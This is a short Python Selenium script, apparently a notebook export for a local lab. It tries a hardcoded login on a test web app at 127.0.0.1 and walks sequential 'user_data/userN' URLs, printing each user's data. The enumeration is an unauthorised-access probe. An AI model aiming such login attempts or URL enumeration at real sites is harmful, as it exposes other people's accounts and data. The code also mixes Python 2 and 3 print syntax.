from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from pyvirtualdisplay import Display
import pdb
import requests

def brute_force_login(driver):



    # In[10]:

    driver.get("http://127.0.0.1:5000/")


    # In[11]:

    elem = driver.find_element_by_name("username")
    elem.send_keys("fish")

    elem = driver.find_element_by_name("password")
    elem.send_keys("chips")

    elem.send_keys(Keys.RETURN)

    #pdb.set_trace()
    print(driver.find_element_by_tag_name('body').text)

    # In[16]:



def sess_pred(driver):

    run = True
    base = "http://127.0.0.1:5000/"

    counter = 0

    while run is True:
        counter += 1
        url = base + "user_data/user" + str(counter)
        print("\n Trying {}".format(url))
        driver.get(url)
        r = requests.get(url)
        print r.status_code
        if r.status_code != 200:
            run = False
        else:
            print(r.text)


display = Display(visible=0, size=(1024, 768))
display.start()
# In[9]:

driver = webdriver.Firefox()
brute_force_login(driver)
#sess_pred(driver)

driver.close()
display.stop()
